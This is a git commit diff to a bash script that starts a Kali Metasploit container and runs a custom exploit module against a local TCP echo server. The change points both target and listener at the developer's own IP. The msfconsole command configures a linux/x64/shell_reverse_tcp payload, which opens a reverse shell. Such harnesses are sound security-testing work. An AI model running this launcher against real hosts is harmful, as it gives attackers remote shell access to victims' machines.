e4daa9b004ea99b2eecc9f80512a7a86e487e975
rsundahl <roy@polyverse.io>
2017-11-03 11:45:42 -0700

    Default to LHOST and RHOST being localhost's external IP address.

--- tcp_echo_server.sh
+++ tcp_echo_server.sh
@@ -1,11 +1,14 @@
 #!/bin/bash
 
-RHOST=$(ifconfig en1 | grep "inet " | awk '{print $2}')
-if [[ "$RHOST" == "" ]]; then
-  RHOST=$(ifconfig en0 | grep "inet " | awk '{print $2}')
+# Local host IP address
+LHOST=$(ifconfig en1 | grep "inet " | awk '{print $2}')
+if [[ "$LHOST" == "" ]]; then
+  LHOST=$(ifconfig en0 | grep "inet " | awk '{print $2}')
 fi
-RPORT=8080
-LHOST=$(docker run -it polyverse-internal.jfrog.io/kali-metasploit ifconfig eth0 | grep inet | awk '{print $2}')
 LPORT=5555
 
-docker run -it -p $LPORT:$LPORT -v $PWD/exploits:/usr/share/metasploit-framework/modules/exploits/custom polyverse-internal.jfrog.io/kali-metasploit msfconsole -x "use exploit/custom/tcp_echo_server.rb; set RHOST $RHOST; set RPORT $RPORT; set payload linux/x64/shell_reverse_tcp; set LHOST $LHOST; set LPORT $LPORT;"
+# Remote host is the local host for development
+RHOST="$LHOST"
+RPORT=8080
+
+docker run -it -p $LPORT:$LPORT -v $PWD/exploits:/usr/share/metasploit-framework/modules/exploits/custom polyverse-internal.jfrog.io/kali-metasploit msfconsole -x "use exploit/custom/tcp_echo_server.rb; set RHOST $RHOST; set RPORT $RPORT; set LHOST $LHOST; set LPORT $LPORT; set PAYLOAD linux/x64/shell_reverse_tcp"
